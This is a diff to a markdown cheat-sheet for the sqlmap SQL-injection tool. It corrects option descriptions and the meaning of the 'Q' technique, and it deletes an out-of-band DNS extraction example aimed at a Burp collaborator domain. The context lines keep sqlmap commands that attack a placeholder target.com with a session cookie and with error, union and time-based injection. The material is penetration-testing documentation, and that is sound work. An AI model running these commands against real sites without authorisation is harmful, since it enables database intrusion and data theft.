@@ -47,7 +47,7 @@ sqlmap -u "http://target.com/page" --cookie="session=abc123" --data="id=1"
 | `--proxy <url>` | HTTP/SOCKS5 proxy |
 | `--ignore-proxy` | Ignore configured proxy settings |
 | `--tor` | Use Tor (requires tor + proxychains) |
-| `--batch` | Never ask for user input (auto yes) |
+| `--batch` | Use default answers instead of prompting |
 | `--random-agent` | Use random User-Agent |
 | `--headers <str>` | Extra HTTP headers |
 | `--auth-type <type>` | Basic/Digest/NTLM/PKI |
@@ -85,7 +85,7 @@ sqlmap -u "http://target.com/page" --cookie="session=abc123" --data="id=1"
 | `U` | UNION query | Fast | Fastest when applicable |
 | `S` | Stacked queries | Variable | Needs multi-statement support |
 | `T` | Time-based blind | Slow | Last resort |
-| `Q` | Out-of-band (DNS) | Variable | Requires `--dns-domain` |
+| `Q` | Inline queries | Variable | DBMS-dependent |
 
 ```bash
 # Force error-based + union only (faster)
@@ -94,8 +94,6 @@ sqlmap -u "http://target.com/page?id=1" --technique=EU
 # Time-based only (when others fail)
 sqlmap -u "http://target.com/page?id=1" --technique=T --time-sec=3
 
-# Out-of-band via DNS (when WAF blocks HTTP responses)
-sqlmap -r req.txt --technique=Q --dns-domain=your.burpcollaborator.net --dbs
 ```
 
 ## Enumeration Commands
